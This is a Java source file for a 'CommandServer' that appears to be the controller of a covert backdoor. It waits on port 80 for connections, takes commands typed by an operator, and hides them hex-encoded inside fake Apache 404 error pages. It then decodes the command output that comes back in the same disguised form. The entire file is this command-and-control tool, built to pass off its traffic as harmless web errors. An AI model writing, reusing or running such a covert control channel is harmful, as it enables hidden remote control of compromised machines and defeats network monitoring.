package networking;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class CommandServer implements Runnable{
	char[] httpPrefix = {0x48,0x54,0x54,0x50,0x2F,0x31,0x2E,0x31,0x20,0x34,0x30,0x34,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x0D,0x0A,0x53,0x65,0x72,0x76,0x65,0x72,0x3A,0x20,0x41,0x70,0x61,0x63,0x68,0x65,0x0D,0x0A,0x4B,0x65,0x65,0x70,0x2D,0x41,0x6C,0x69,0x76,0x65,0x3A,0x20,0x74,0x69,0x6D,0x65,0x6F,0x75,0x74,0x3D,0x34,0x2C,0x20,0x6D,0x61,0x78,0x3D,0x31,0x36,0x39,0x0D,0x0A,0x43,0x6F,0x6E,0x6E,0x65,0x63,0x74,0x69,0x6F,0x6E,0x3A,0x20,0x4B,0x65,0x65,0x70,0x2D,0x41,0x6C,0x69,0x76,0x65,0x0D,0x0A,0x54,0x72,0x61,0x6E,0x73,0x66,0x65,0x72,0x2D,0x45,0x6E,0x63,0x6F,0x64,0x69,0x6E,0x67,0x3A,0x20,0x63,0x68,0x75,0x6E,0x6B,0x65,0x64,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2D,0x54,0x79,0x70,0x65,0x3A,0x20,0x74,0x65,0x78,0x74,0x2F,0x68,0x74,0x6D,0x6C,0x3B,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3D,0x55,0x54,0x46,0x2D,0x38,0x0D,0x0A,0x0D,0x0A,0x31,0x37,0x35,0x0D,0x0A,0x3C,0x68,0x74,0x6D,0x6C,0x3E,0x0A,0x3C,0x68,0x65,0x61,0x64,0x3E,0x0A,0x3C,0x74,0x69,0x74,0x6C,0x65,0x3E,0x48,0x54,0x54,0x50,0x20,0x34,0x30,0x34,0x20,0x2D,0x20,0x46,0x69,0x6C,0x65,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x3C,0x2F,0x74,0x69,0x74,0x6C,0x65,0x3E,0x0A,0x3C,0x6D,0x65,0x74,0x61,0x20,0x68,0x74,0x74,0x70,0x2D,0x65,0x71,0x75,0x69,0x76,0x3D,0x22,0x43,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2D,0x54,0x79,0x70,0x65,0x22,0x20,0x63,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x3D,0x22,0x74,0x65,0x78,0x74,0x2F,0x68,0x74,0x6D,0x6C,0x3B,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3D,0x69,0x73,0x6F,0x2D,0x38,0x38,0x35,0x39,0x2D,0x31,0x22,0x3E,0x0A,0x3C,0x2F,0x68,0x65,0x61,0x64,0x3E,0x0A,0x0A,0x3C,0x62,0x6F,0x64,0x79,0x20,0x62,0x67,0x63,0x6F,0x6C,0x6F,0x72,0x3D,0x22,0x23,0x46,0x46,0x46,0x46,0x46,0x46,0x22,0x20,0x74,0x65,0x78,0x74,0x3D,0x22,0x23};
	char[] httpPostfix = {0x22,0x20,0x73,0x74,0x79,0x6C,0x65,0x3D,0x22,0x66,0x6F,0x6E,0x74,0x2D,0x66,0x61,0x6D,0x69,0x6C,0x79,0x3A,0x20,0x41,0x72,0x69,0x61,0x6C,0x3B,0x20,0x66,0x6F,0x6E,0x74,0x2D,0x73,0x69,0x7A,0x65,0x3A,0x20,0x31,0x34,0x70,0x78,0x22,0x3E,0x0A,0x3C,0x68,0x32,0x3E,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x21,0x3C,0x2F,0x68,0x32,0x3E,0x3C,0x62,0x72,0x3E,0x0A,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x79,0x6F,0x75,0x20,0x68,0x61,0x76,0x65,0x20,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x20,0x6F,0x6E,0x20,0x74,0x68,0x69,0x73,0x20,0x73,0x65,0x72,0x76,0x65,0x72,0x2E,0x3C,0x62,0x72,0x3E,0x0A,0x3C,0x62,0x72,0x3E,0x0A,0x48,0x54,0x54,0x50,0x20,0x34,0x30,0x34,0x20,0x2D,0x20,0x46,0x69,0x6C,0x65,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x0A,0x3C,0x2F,0x62,0x6F,0x64,0x79,0x3E,0x0A,0x3C,0x2F,0x68,0x74,0x6D,0x6C,0x3E,0x0A,0x0A,0x0A,0x0D,0x0A,0x30,0x0D,0x0A,0x0D,0x0A};
	char[] httpPostfixFinal = {0x22,0x20,0x73,0x74,0x79,0x6C,0x65,0x3D,0x22,0x66,0x6F,0x6E,0x74,0x2D,0x66,0x61,0x6D,0x69,0x6C,0x79,0x3A,0x20,0x41,0x72,0x69,0x61,0x6C,0x3B,0x20,0x66,0x6F,0x6E,0x74,0x2D,0x73,0x69,0x7A,0x65,0x3A,0x20,0x31,0x34,0x70,0x78,0x22,0x3E,0x0A,0x3C,0x68,0x32,0x3E,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x21,0x3C,0x2F,0x68,0x32,0x3E,0x3C,0x62,0x72,0x3E,0x0A,0x54,0x68,0x65,0x20,0x70,0x61,0x67,0x65,0x20,0x79,0x6F,0x75,0x20,0x68,0x61,0x76,0x65,0x20,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x65,0x64,0x20,0x63,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x62,0x65,0x20,0x66,0x6F,0x75,0x6E,0x64,0x20,0x6F,0x6E,0x20,0x74,0x68,0x69,0x73,0x20,0x73,0x65,0x72,0x76,0x65,0x72,0x2E,0x3C,0x62,0x72,0x3E,0x0A,0x3C,0x62,0x72,0x3E,0x0A,0x48,0x54,0x54,0x50,0x20,0x34,0x30,0x34,0x20,0x2D,0x20,0x46,0x69,0x6C,0x65,0x20,0x4E,0x6F,0x74,0x20,0x46,0x6F,0x75,0x6E,0x64,0x0A,0x3C,0x2F,0x62,0x6F,0x64,0x79,0x3E,0x0A,0x3C,0x2F,0x68,0x74,0x6D,0x6C,0x3E,0x0A,0x0A,0x0A,0x0D,0x0A,0x31,0x0D,0x0A,0x0D,0x0A};
	ServerSocket server;
	Scanner stdin;
	public CommandServer() throws IOException{
		server = new ServerSocket(80);
		stdin = new Scanner(System.in);
	}
	@Override
	public void run() {
		while(true){
			try {
				Socket connection=server.accept();
				PrintWriter out = new PrintWriter(connection.getOutputStream(), true);
		        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		        char[] buffer = new char[552];
		        in.read(buffer);
		        String command = stdin.nextLine();
		        ArrayList<String> commandEncoded = encodeResponse(command);
		        for(String chunk : commandEncoded){
		        	out.print(chunk);
		        	out.flush();
		        }
		        buffer = new char[552];
		        String output = "";
		        while(buffer[547]!='1'){
		        	in.read(buffer);
		        	output+=decodeResponse(new String(buffer));
		        }
		        System.out.println(output);
		        connection.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	private String decodeResponse(String buffer) {
		String encData = buffer.substring(httpPrefix.length, httpPrefix.length+6);
		String byte1 = encData.substring(0,2);
		String byte2 = encData.substring(2,4);
		String byte3 = encData.substring(4);
		String output = "";
		output+=(char)Integer.parseInt(byte1,16);
		output+=(char)Integer.parseInt(byte2,16);
		output+=(char)Integer.parseInt(byte3,16);
		return output;
	}
	private ArrayList<String> encodeResponse(String message){
		ArrayList<String> temp = new ArrayList<String>();
		List<String> inputChunks = NetUtil.getParts(message, 3);
		for(int i = 0; i < inputChunks.size()-1; i++){
			String byte1 = Integer.toHexString(inputChunks.get(i).charAt(0));
			String byte2 = Integer.toHexString(inputChunks.get(i).charAt(1));
			String byte3 = Integer.toHexString(inputChunks.get(i).charAt(2));
			temp.add(new String(httpPrefix)+byte1+byte2+byte3+new String(httpPostfix));
		}
		String byte1 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(0));
		String byte2 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(1));
		String byte3 = Integer.toHexString(inputChunks.get(inputChunks.size()-1).charAt(2));
		temp.add(new String(httpPrefix)+byte1+byte2+byte3+new String(httpPostfixFinal));
		return temp;
	}
	
}
